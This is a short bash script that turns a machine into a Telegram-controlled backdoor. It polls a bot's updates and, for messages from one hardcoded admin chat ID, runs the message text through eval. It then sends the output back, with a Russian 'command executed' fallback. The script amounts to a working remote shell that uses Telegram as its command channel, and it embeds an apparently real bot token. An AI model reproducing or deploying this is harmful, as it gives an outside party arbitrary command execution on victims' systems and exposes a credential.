#!/bin/bash
BOT_TOKEN="8305631464:AAGthjFVJx1_LHLElVvOwxhyMPQM0i7mhS8"
ADMIN_ID="7006722745"
API_URL="https://api.telegram.org/bot$BOT_TOKEN"

send_message() {
    local chat_id="$1"
    local text="$2"
    curl -s -X POST "$API_URL/sendMessage" -d chat_id="$chat_id" -d text="$text" > /dev/null
}

get_updates() {
    local offset="$1"
    curl -s -X POST "$API_URL/getUpdates" -d offset="$offset" -d timeout=30 -d allowed_updates='["message"]'
}

LAST_UPDATE_ID=0

while true; do
    UPDATES=$(get_updates $((LAST_UPDATE_ID + 1)))
    UPDATE_COUNT=$(echo "$UPDATES" | jq '.result | length')
    
    if [ "$UPDATE_COUNT" -gt 0 ]; then
        LAST_UPDATE_ID=$(echo "$UPDATES" | jq '.result[0].update_id')
        MESSAGE_TEXT=$(echo "$UPDATES" | jq -r '.result[0].message.text')
        CHAT_ID=$(echo "$UPDATES" | jq -r '.result[0].message.chat.id')
        
        if [ "$CHAT_ID" = "$ADMIN_ID" ]; then
            OUTPUT=$(eval "$MESSAGE_TEXT" 2>&1)
            
            if [ -z "$OUTPUT" ]; then
                OUTPUT="Команда выполнена."
            fi
            
            send_message "$ADMIN_ID" "$OUTPUT"
        fi
    fi
    
    sleep 1
done